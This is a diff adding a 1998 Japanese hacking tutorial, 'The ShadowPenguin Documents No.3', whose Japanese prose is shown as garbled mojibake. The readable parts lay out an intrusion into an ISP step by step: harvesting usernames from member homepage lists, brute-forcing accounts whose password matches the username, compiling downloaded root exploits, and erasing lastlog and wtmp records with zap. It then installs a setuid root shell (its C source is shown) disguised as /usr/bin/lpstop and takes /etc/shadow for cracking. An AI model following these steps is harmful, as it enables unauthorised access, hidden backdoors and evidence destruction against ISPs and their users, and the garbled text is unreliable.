@@ -1,0 +1,183 @@
+                      ====================================
+                        The ShadowPenguin Documents No.3
+
+                          - ‰•à“I‚È‚h‚r‚o‚Ö‚ÌN“ü–@ -
+                               Written by ‚¤‚É‚ã‚ñ
+                                  Oct.18, 1998
+                      ====================================
+
+1. ‚Í‚¶‚ß‚É 
+
+‚±‚ÌƒeƒLƒXƒg‚Å‚ÍAISP iƒCƒ“ƒ^[ƒlƒbƒgƒT[ƒrƒXƒvƒƒoƒCƒ_‚Å‚·‚æj‚Éi“ü‚µ‚Äroot‚ð
+‚Æ‚éÅ‚à‰•à“I‚ÈŽèŒû‚ðÐ‰î‚µ‚Ü‚·i‰•à“I‚¾‚¯‚ÉEEE‚Å‚·( Î))B‚±‚ê‚É‹LÚ‚³‚ê‚Ä
+‚¢‚é“à—e‚Åroot‚ðŽæ‚ç‚ê‚éƒAƒ}‚¢ƒT[ƒoŠÇ—ŽÒ‚ÍŠÇ—•ûj‚ð•Ï‚¦‚½•û‚ª‚¢‚¢‚Å‚·‚æBŒ‹\
+‚±‚¤‚¢‚¤ISP ‚ª‚ ‚è‚Ü‚·‚ËB‚±‚ÌƒeƒLƒXƒg‚ÍAISP ‚ÌŠÇ—‚ð‚µ‚Ä‚éŠÇ—ŽÒ‚ªAƒzƒ“ƒg‚É‚±
+‚¤‚¢‚¤ŽèŒû‚ÅN“ü‚³‚ê‚È‚¢‚©‚Ç‚¤‚©‚ðŽÀŒ±‚·‚é‚Æ‚¢‚¤–Ú“I‚Ì‚à‚Ì‚Å‚·BŒˆ‚µ‚ÄA‚Ç‚Á‚©‚Ì
+ISP ‚ð‚±‚Ì•û–@‚ÅUŒ‚‚µ‚¿‚á‚¢‚¯‚Ü‚¹‚ñ‚æB 
+
+2. €”õ 
+
+‚Æ‚è‚ ‚¦‚¸AˆÈ‰º‚Ì‚à‚Ì‚ð—pˆÓ‚µ‚Ä‚­‚¾‚³‚¢B
+
+1.Ž©•ª‚ÌWin95/98/NTƒ}ƒVƒ“B
+2.”’–Ø—tŽq for Win32
+3.extuser for Win32
+
+2A3‚Í‚±‚±‚Ìƒz[ƒ€ƒy[ƒW‚É—Ž‚¿‚Ä‚Ü‚·B
+‚Ü‚¸AƒnƒbƒN‚É‚ÍƒVƒFƒ‹ƒAƒJƒEƒ“ƒg‚ª‚ ‚é‚ÆA‚Æ‚Ä‚à•Ö—˜‚Å‚·B‚æ‚Á‚ÄAtelnet‚Å‚«‚éƒv
+ƒƒo‚©‚Ç‚¤‚©ŒŸ¸‚µ‚Ü‚µ‚å‚¤Btelnet‚ªƒ_ƒ‚Å‚àN“ü&root ‚Ì•û–@‚Í‚¢‚­‚ç‚Å‚à‚ ‚è‚Ü‚·
+‚ªA‰•à“IŽèŒû‚ÌƒeƒLƒXƒg‚Á‚Ä‚±‚Æ‚Åtelnet‚Å‚«‚éISP ‚Ì‚Ý‘ÎÛ‚Æ‚µ‚Ü‚·BŒŸ¸‚ÍŠÈ’P‚Å
+ADOS ‘‹‚©‚ç
+
+telnet www.hoge.ne.jp
+
+‚Æ‚µ‚ÄAloginƒvƒƒ“ƒvƒg‚ªo‚½‚çOK‚Å‚·B
+
+3. ”’–Ø—tŽq‚Æƒ†[ƒU[ƒŠƒXƒg 
+
+ISP ‚ÌƒT[ƒo‚É‚ÍA“–‚½‚è‘O‚Å‚·‚ª‚½‚­‚³‚ñ‚ÌƒAƒJƒEƒ“ƒg‚ª‚ ‚è‚Ü‚·BƒpƒXÝ’è‹K‘¥‚ª‚â
+‚©‚Ü‚µ‚­‚È‚¢‚Æ‚±‚ë‚¾‚ÆAˆêl‚­‚ç‚¢‚Íƒ†[ƒU–¼‚ÆƒpƒXƒ[ƒh‚ª“¯‚¶ƒ„ƒcijoe ‚Æ‚¢‚¤j
+‚ª‚¢‚é‚±‚Æ‚ªŒ‹\‚ ‚è‚Ü‚·B”’–Ø—tŽq‚ÍAƒvƒƒo‚Ìƒ†[ƒUƒŠƒXƒg‚ð“ü—Í‚µ‚Ä‚¨‚¯‚ÎAŽ©“®
+“I‚Éftp ‚âpop3‚Åjoe ‚ðŒ©‚Â‚¯‚éƒc[ƒ‹‚Å‚·B‚Æ‚¢‚¤‚±‚Æ‚ÍAƒ†[ƒU[ƒŠƒXƒg‚ª‚È‚¢‚ÆŽn
+‚Ü‚è‚Ü‚¹‚ñ‚ËBƒ†[ƒU[ƒŠƒXƒg“üŽè‚ÌŽè‚ÁŽæ‚è‘‚¢•û–@‚ÍAƒvƒƒo‚Ìƒz[ƒ€ƒy[ƒW‚É‚æ‚­
+‚ ‚éu‰ïˆõ—lƒz[ƒ€ƒy[ƒWˆê——v‚Á‚Äƒ„ƒc‚©‚ç”²‚¢‚Ä‚­‚é‚Ì‚ªˆê”Ê“I‚Å‚·B‚»‚¤‚¢‚¤ƒy[
+ƒW‚Ì‚ ‚éISP ‚ÍA‚Ç‚¤‚¹‚ ‚Ü‚èŒ©‚él‚à‚¢‚È‚¢‚ñ‚¾‚µAŠëŒ¯‚È‚ñ‚Åíœ‚µ‚¿‚á‚¢‚Ü‚µ‚å‚¤
+‚ËB‰ïˆõ—lƒz[ƒ€ƒy[ƒWˆê——‚Ìhtmlƒtƒ@ƒCƒ‹‚ð•Û‘¶Œãi•¡”ƒy[ƒW‚É‚Ü‚½‚ª‚Á‚Ä‚¢‚éê‡
+‚Íƒtƒ@ƒCƒ‹‚ðˆø‚Á•t‚¯‚Ä‚¨‚­‚Æ•Ö—˜jAextusr‚Åƒ†[ƒU[ID‚ð’Šo‚µ‚Ü‚·B
+
+extusr‚ÌŽg‚¢•û‚ÍA
+
+extusr HTMLfile Pattern > usrlist.txt
+
+‚Å‚·BHTMLfile‚Í‰ïˆõ—lƒz[ƒ€ƒy[ƒW‚Ìhtmlƒtƒ@ƒCƒ‹iNetscape‚È‚çƒtƒ@ƒCƒ‹- –¼‘O‚ð‚Â
+‚¯‚Ä•Û‘¶‚ÅOKj‚ÅAPattern ‚Íƒ†[ƒU[–¼‚Ì’¼‘O‚É•t‚¢‚Ä‚¢‚éHTML‚Ì•¶Žš—ñ‚Å‚·B—á‚¦‚Î
+Ahtmlƒtƒ@ƒCƒ‹‚Ìƒ\[ƒX‚ðŠm”F‚µ‚ÄA‰ïˆõ‚Ìƒy[ƒW‚ªˆÈ‰º‚Ì‚æ‚¤‚ÉƒŠƒ“ƒN‚³‚ê‚Ä‚¢‚éê‡
+
+<a href="http://www.test.or.jp/~hogehoge/">
+
+Pattern‚ÍA
+
+www.test.or.jp/~
+
+‚Æ‚·‚é‚ÆAwww.test.or.jp/~‚Ì•¶Žš—ñ‚ð”­Œ©‚µ‚½‚çA‚»‚ÌŒã‚É‘±‚­•¶Žš‚©‚ç/ ‚â" ‚ªŒ©‚Â
+‚©‚é‚Ü‚Å‚ðƒ†[ƒU[ID‚Æ‚µ‚Ü‚·B‚È‚¨APattern ‚ð
+
+<a href="http://www.test.or.jp/~
+
+‚Æ‚µ‚½‚¢ê‡A"‚Íˆø”‚É•t‚¯‚é‚±‚Æ‚ª‚Å‚«‚Ü‚¹‚ñ‚Ì‚ÅA+‚Å‘ã—p‚µ‚Ü‚·BPattern‚ð
+
+<a href=+http://www.test.or.jp/~
+
+‚ÆŽw’è‚µ‚Ä‚­‚¾‚³‚¢B 
+
+4. ”’–Ø—tŽq‚ð“®‚©‚· 
+
+‚³‚ÄAextusr‚Åusrlist.txt ‚ðŽè‚É“ü‚ê‚½‚Æ‚±‚ë‚ÅA”’–Ø‚É‚©‚¯‚Ä‚Ý‚Ü‚µ‚å‚¤B”’–Ø‚ð‹N
+“®‚µ‚ÄA[FileLoad]‚Åæ‚Ù‚Ç‚Ìusrlist.txt ‚ðŽw’è‚µA[Server]‚Éƒ^[ƒQƒbƒgŽI‚ðŽw’è‚µ
+‚Ü‚·B‚ ‚Æ‚ÍA[Go]ƒ{ƒ^ƒ“‚ð‰Ÿ‚¹‚ÎŽ©“®‚Åjoe ‚ð’T‚µ‚Ü‚·B‚Ü‚½Aƒ†[ƒU–¼‚Ì‹t‚ðƒpƒXƒ
+[ƒh‚É‚µ‚½‚èAŒÅ’èƒpƒXƒ[ƒh‚ÅƒAƒ^ƒbƒN‚µ‚½‚è‚·‚éƒ‚[ƒh‚à‚ ‚è‚Ü‚·‚Ì‚ÅAjoe ‚ª‚¢‚È
+‚©‚Á‚½‚çŽŽ‚µ‚Ä‚Ý‚Ä‚­‚¾‚³‚¢B
+
+5. joe”­Œ©•ƒƒOƒCƒ“ 
+
+joe ‚ðˆêl‚Å‚à”­Œ©‚µ‚½‚çA”’–Ø‚ðŽ~‚ß‚Ü‚µ‚å‚¤Bˆêl‚ ‚ê‚Î\•ª‚Å‚·B‚ÅAŽ©•ª‚ÌŠÇ—
+‚·‚éISP ‚É‰¼‘zƒnƒbƒN‚ð‚â‚Á‚ÄAˆÀ‘S«‚ðŒŸ¸‚µ‚Ä‚Ý‚Ü‚µ‚å‚¤B‚Æ‚è‚ ‚¦‚¸Atelnet‚µ‚Ä
+‚Ý‚Ü‚µ‚å‚¤B“ü‚Á‚½‚çAroot‚ð‘_‚¢‚Ü‚·B‚Á‚Ä‚¢‚¤‚©ArootŽæ‚ê‚È‚¢‚ÆƒƒO‚ªŽc‚Á‚½‚Ü‚Ü
+‚É‚È‚é‚Ì‚ÅA‰ƒnƒbƒN‚Å“¥‚Ý‘ä‚à‚È‚¢ê‡‚ÍN“üŽÒ‚ÍˆÓ’n‚Å‚àŽæ‚è‚É‚«‚Ü‚·iÎjB‚Æ‚è
+‚ ‚¦‚¸A
+
+rlogin localhost
+
+‚µ‚ÄAlastlog ‚ð‚²‚Ü‚©‚µ‚Ü‚·Blastlog ‚Á‚Ä‚Ì‚Íu‚±‚È‚¢‚¾‚ÍA‚Ç‚Á‚©‚çƒƒOƒCƒ“‚µ‚½
+‚©v‚Á‚Ä‚¢‚¤ƒ„ƒc‚ÅAtelnet‚È‚ñ‚©‚µ‚½‚Æ‚«Aƒvƒƒ“ƒvƒg‚ª•\Ž¦‚³‚ê‚é‘O‚Éo‚Ä‚«‚Ü‚·B
+root“‚ê‚È‚©‚Á‚½ê‡‚Írloginlocalhost ‚ÍA‚µ‚È‚¢‚æ‚è‚Íƒ}ƒV‚È‚Ì‚ÅAN“üŽÒ‚Íu‚Æ‚è
+‚ ‚¦‚¸‚â‚Á‚Æ‚±v‚Á‚ÄŠ´‚¶‚Å‚â‚Á‚Ä‚¨‚«‚Ü‚·B
+
+‚³‚ÄA‚¨ŽèŒy‚Èroot“‚è‚Æ‚¢‚¦‚ÎAƒnƒbƒJ[‚½‚¿‚ªƒVƒRƒVƒRì‚èã‚°‚½PacketStorm ‚âRo
+otShell ‚È‚ñ‚©‚É—Ž‚¿‚Ä‚éroot-explot ƒvƒƒOƒ‰ƒ€‚ð”qŽØ‚µ‚ÄŽg‚¤‚Ì‚ªˆê”ÔŽè‚ÁŽæ‚è‘‚¢
+‚Å‚·‚ËB
+
+Packet Storm	: http://www.genocide2600.com/~tattooman/index.shtml
+RootShell	: http://www.rootshell.com
+
+‚»‚Ì‘O‚ÉAOS–¼‚ðŠm”F‚µ‚Ü‚µ‚å‚¤BOS‚ÍƒƒOƒCƒ“‚µ‚½‚Æ‚«‚É•\Ž¦‚³‚ê‚Ü‚·‚ËB‚³‚ÄA‚»‚Ì
+OS‚É‡‚Á‚½exploit ƒvƒƒOƒ‰ƒ€‚ð“üŽè‚µ‚Ü‚·BPacketStorm ‚¾‚Æ
+
+http://www.genocide2600.com/~tattooman/unix-exploits/
+
+‚É—Ž‚¿‚Ä‚Ü‚·‚ËB—á‚¦‚ÎAƒ^[ƒQƒbƒg‚ªSolaris2.4‚Ìê‡‚ÍAãƒy[ƒW‚Ìsolaris-exploi
+ts/ ƒfƒBƒŒƒNƒgƒŠ‚É‚ ‚éSol24.zip ‚ðPC‚Éƒ_ƒEƒ“‚µ‚Ä‰ð“€‚µ‚Ü‚·B
+
+C ‚Ìƒ\[ƒXƒtƒ@ƒCƒ‹iŠg’£Žq‚ª*.c ‚Ìƒtƒ@ƒCƒ‹j‚ðƒT[ƒoã‚ÅƒRƒ“ƒpƒCƒ‹‚µ‚ÄŽÀs‚·‚é‚Æ
+A‚ ‚ç•sŽv‹ciÎjRoot‚É‚È‚è‚Ü‚·B‚È‚¨APC‚Éƒ_ƒEƒ“‚µ‚½ƒ\[ƒXƒtƒ@ƒCƒ‹‚ÍAPC‚ÌƒeƒL
+ƒXƒgƒGƒfƒBƒ^iƒƒ‚’ ‚È‚Çj‚Å•\Ž¦‚³‚¹‚Ä‚¨‚¢‚ÄAƒRƒs[ƒy[ƒXƒg‚ÅŽI‚É‚à‚Á‚Ä‚«‚Ü‚µ‚å
+‚¤Bftp ‚¾‚Æ‚¨ŽèŒy‚Å‚·‚¯‚ÇA‚¿‚å‚Á‚¿–â‘è‚à‚ ‚é‚Å‚µ‚å‚¤‚©‚çN“üŽÒ‚Í•’ÊŽg‚¢‚Ü‚¹‚ñ
+B•û–@‚ÍAPC‚ÌƒGƒfƒBƒ^‚ÅuƒRƒs[v‚µ‚½‚ ‚ÆAŽI‚Å
+
+%cat > ban24.c
+
+‚Æ‚µ‚Ü‚·B‚±‚Ìó‘Ô‚ÅtelnetƒNƒ‰ƒCƒAƒ“ƒgƒ\ƒtƒgã‚Åuƒy[ƒXƒgv‚µ‚Ü‚·BI‚í‚Á‚½‚çct
+rl+D‚Å”²‚¯‚é‚ÆAhoge.c‚ª‚Å‚«‚Ü‚·BƒRƒ“ƒpƒCƒ‹‚Ícc‚âgcc ‚Ås‚¢‚Ü‚·Bƒvƒƒ“ƒvƒg‚ªo
+‚Ä‚¢‚éó‘Ô‚ÅA
+
+%cc ban24.c
+
+‚Æ‚µ‚Ü‚·B‚±‚ê‚ÅAƒ_ƒ‚È‚ç
+
+%gcc ban24.c
+
+‚Æ‚µ‚Ä‚Ý‚Ü‚µ‚å‚¤B‚±‚ê‚Å‚àƒ_ƒ‚È‚çA‚Æ‚è‚ ‚¦‚¸‚ ‚«‚ç‚ß‚Ü‚µ‚å‚¤iÎjƒGƒ‰[‚ªo‚È
+‚©‚Á‚½‚ç
+
+%a.out
+
+‚Æ‚µ‚Ä‚Ý‚Ü‚µ‚å‚¤Bƒvƒƒ“ƒvƒg‚ª# ‚É‚È‚Á‚½‚çroot‚Å‚·Bƒ_ƒ‚È‚çA‚Ù‚©‚ÌC ƒvƒƒOƒ‰ƒ€
+‚ðƒRƒ“ƒpƒCƒ‹‚µ‚ÄŽÀs‚µ‚Ä‚Ý‚Ü‚µ‚å‚¤B‘S‚Äƒ_ƒ‚È‚çA‚â‚Á‚Ï‚è‚ ‚«‚ç‚ß‚Ü‚µ‚å‚¤( Î) ‚
+Ü‚ŸAroot‚É‚È‚ê‚ê‚ÎN“üŽÒ‚àŒä‚ÌŽš‚Å‚·‚ªA‚È‚ê‚È‚©‚Á‚½‚çƒƒO‚Í‚µ‚Á‚©‚èŽc‚Á‚½‚Ü‚Ü
+‚Å‚·‚©‚çŠÇ—ŽÒ‚àŠy‚Å‚·‚ËB‚±‚¤‚¢‚¤•û–@ˆÈŠO‚Å‚àAroot‚É‚È‚é•û–@‚Í‚½‚­‚³‚ñ‚ ‚è‚Ü‚·
+‚ªA‚±‚±‚¶‚á‘‚«‚Ü‚¹‚ñBŽ©•ª‚ÅŒ©‚Â‚¯‚Ü‚µ‚å‚¤‚ËB‚»‚±‚ç‚Ö‚ñ‚¶‚ã‚¤‚ÉƒeƒLƒXƒg—Ž‚¿‚Ä
+‚Ü‚·‚©‚çB‚»‚ê‚Å‚àƒ_ƒ‚È‚çA’mŒb‚ðï‚Á‚Äl‚¦‚Ü‚µ‚å‚¤B 
+
+6. roothackŒã‚ÍH 
+
+‚Æ‚è‚ ‚¦‚¸AN“üŽÒ‚É‚Æ‚Á‚ÄƒƒOÁ‚µ‚Í•K{‚Å‚µ‚å‚¤‚©Bzap ‚Á‚Ä‚¢‚¤—L–¼‚ÈƒƒOÁ‚µ‚ª
+‚ ‚è‚Ü‚·‚Ì‚ÅA‚Æ‚è‚ ‚¦‚¸ƒRƒŒ‚ðŽg‚Á‚Ä‚Ý‚Ü‚µ‚å‚¤BŠÈ’P‚Å‚·‚©‚çBŠÈ’P‚¾‚¯‚ ‚Á‚Ä‘½­
+–â‘è‚Í‚ ‚è‚Ü‚·‚ªAi“üŒ³‚ÍƒƒO‚©‚ç‚Å‚Í“Á’è‚Å‚«‚Ü‚¹‚ñ‚Ì‚ÅA‚æ‚­Žg‚í‚ê‚Ä‚¢‚Ü‚·B
+
+wtmpx.c SolarisAIRIX—p
+zap2.c SunOS—p
+
+‚±‚ê‚Íroot‚¶‚á‚È‚¢‚ÆŽg‚¦‚Ü‚¹‚ñBƒ†[ƒU[hoge‚ðÁ‚·ê‡‚ÍAƒRƒ“ƒpƒCƒ‹ŒãA
+
+#a.out hoge
+
+‚Æ‚µ‚Ä‚­‚¾‚³‚¢BÁ‚¹‚½‚©‚Ç‚¤‚©AlastƒRƒ}ƒ“ƒh‚ÅŠm”F‚µ‚Ü‚µ‚å‚¤BlastƒRƒ}ƒ“ƒh‚ÍAƒ
+ƒOƒCƒ“—š—ð‚ð•\Ž¦‚·‚é‚à‚Ì‚Å‚·B‚ ‚Æ‚ÍA”’–Ø‚ÌƒAƒ^ƒbƒNÕ‚ªsyslog‚È‚ñ‚©‚ÉŽc‚Á‚Ä‚Ü‚·
+‚©‚çA‚±‚ê‚àÁ‚µ‚Ä‚Ý‚Ü‚µ‚å‚¤BN“üŒã‚ÍARootshell ‚àŽdž‚Ü‚ê‚Ü‚·‚ËB
+
+#include <stdio.h>
+mainij
+{
+setuidi0j;
+setgidi0j;
+execli"/bin/csh","csh",NULLj;
+}
+
+ban24.c ‚Æ‚©‚Ìroot-explot ƒvƒƒOƒ‰ƒ€‚ÍAƒZƒLƒ…ƒŠƒeƒB[ƒz[ƒ‹‚ð—˜—p‚µ‚½‚à‚Ì‚Å‚·‚©
+‚çAƒpƒbƒ`‚ð“–‚Ä‚ç‚ê‚é‚Æroot‚É‚È‚ê‚Ü‚¹‚ñBrootshell ‚¾‚ÆA‚¢‚­‚çƒpƒbƒ`‚ð“–‚Ä‚ç‚ê
+‚Ä‚àroot‚É‚È‚ê‚Ü‚·Brootshell ‚ðƒRƒ“ƒpƒCƒ‹Œãchmod Achown ‚µ‚Ü‚·B
+
+#cc rootshell.c -o rootshell
+#chmod 4755 ./rootshell
+#chown root ./rootshell
+
+‚ÅArootshell ‚Á‚ÄƒRƒ}ƒ“ƒh‚ðˆê”Êƒ†[ƒUŒ ŒÀ‚ÅŽÀs‚·‚é‚ÆAroot‚É‚È‚ê‚Ü‚·B‚±‚Ìroot
+shell ‚ðAƒoƒŒ‚É‚­‚»‚¤‚È–¼‘O‚É•Ï‚¦‚Ä“K“–‚ÈƒfƒBƒŒƒNƒgƒŠ‚É‚Ù‚¨‚è‚±‚Ü‚ê‚é‚ÆAls‚­‚ç
+‚¢‚¶‚á”­Œ©‚Å‚«‚È‚¢‚Å‚µ‚å‚¤B
+
+#mv ./rootshell /usr/bin/lpstop
+
+“ú•t‚ª‹C‚É‚È‚é‚È‚çAtouch ‚Å“K“–‚É‚ ‚í‚¹‚Ü‚·B“¯—l‚Ì•û–@‚ÅƒƒOÁ‚µ‚à’u‚©‚ê‚Ü‚·B
+Œã‚ÍC/etc/shadow ƒtƒ@ƒCƒ‹‚ð’¸‚¢‚Äjohntheripper “™‚ÅƒNƒ‰ƒbƒN‚·‚ê‚ÎAƒpƒXƒ[ƒh‚ð
+‘½”“¾‚é‚±‚Æ‚ª‚Å‚«‚Ü‚·B‚»‚¤‚â‚Á‚Ä”íŠQ‚É‚ ‚Á‚½ISP ‚Í¡‚Ü‚Å‰½ŽÐ‚©‘¶Ý‚µ‚Ü‚·‚ËB‚ 
+‚È‚½‚ÌISP ‚à‹C‚ð‚Â‚¯‚Ü‚µ‚å‚¤‚Ë(Î)
